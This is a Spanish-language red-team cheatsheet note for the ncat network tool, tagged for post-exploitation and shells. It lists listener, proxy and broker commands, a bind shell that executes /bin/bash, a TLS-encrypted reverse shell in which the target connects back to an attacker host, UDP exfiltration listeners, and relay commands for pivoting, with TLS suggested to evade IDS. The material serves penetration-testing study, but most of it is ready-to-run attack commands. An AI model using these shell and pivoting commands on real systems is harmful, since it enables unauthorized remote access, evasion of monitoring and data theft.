---
aliases:
tags:
  - env/linux
  - asset/network
  - tool/ncat
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Post-Explotación]]"
tertiary categories:
  - "[[Shells]]"
kind: Tool
linked:
  - "[[nc]]"
  - "[[Reverse Shell]]"
  - "[[Pivoting & Port Forwarding]]"
---
# Herramienta `ncat`

> [!info] ncat
> [[nc|netcat]] modernizado (parte de Nmap), con **SSL/TLS**, proxies, broker mode, whitelisting y keep-open. Sintaxis: `ncat [opciones] [host] [puerto]`.
^definicion

---

## Cheatsheet

| **Comando** | **Qué obtenés** | **Cuándo** |
|---|---|---|
| `ncat -lvnp 4444` | Listener TCP | Estándar |
| `ncat --ssl -lvnp 4444` | Listener con TLS | Shell cifrada / evadir IDS |
| `ncat --ssl <target> <port>` | Conectar TLS | Servicio SSL/STARTTLS |
| `ncat -lvnp 4444 -e /bin/bash` | Bind shell | Bypass de filtros outbound |
| `ncat -lvnp 4444 --allow <ip>` | Listener con whitelist | Limitar exposición |
| `ncat --proxy <ip>:<port> --proxy-type http <target> <port>` | Conectar vía proxy HTTP | Pivoting |
| `ncat --broker -lvnp 4444` | Broker mode | Chat multi-cliente / relay |
| `ncat -u -lvnp 4444` | Listener UDP | UDP exfil/recv |
^ncat-cheatsheet

---

## Opciones

| **Flag** | **Qué hace** |
|---|---|
| `-l` / `--listen` | Modo servidor |
| `-k` / `--keep-open` | No cierra tras la primera conexión (multi-cliente) |
| `-e` / `--exec` | Ejecuta un programa al conectar |
| `--sh-exec "cmd"` | Ejecuta un comando shell |
| `--ssl` | Cifra la conexión con TLS |
| `--ssl-cert` / `--ssl-key` | Certificado y clave del server SSL |
| `--allow <ip>` | Whitelist de IPs |
| `--proxy` / `--proxy-type` | Conexión vía proxy (http/socks) |
| `--broker` | Modo broker (relay entre clientes) |
| `-z` / `-v` / `-u` | Scan / verbose / UDP |

---

## TLS Reverse Shell

```bash
# Attacker: generar cert + listener TLS
openssl req -new -x509 -keyout key.pem -out cert.pem -days 365 -nodes
ncat --ssl -lvnp 4444 --ssl-cert cert.pem --ssl-key key.pem

# Target
ncat --ssl <attacker> 4444 -e /bin/bash
```

---

## Relay / Pivoting

```bash
# Forward local:8080 → remote target:80
ncat -lvnp 8080 -c "ncat <target> 80"
# o
ncat -l 8080 --sh-exec "ncat <target> 80"
```

Ver [[Pivoting & Port Forwarding]].

---

## Notas Relacionadas

- [[nc]]
- [[Reverse Shell]]
- [[Pivoting & Port Forwarding]]
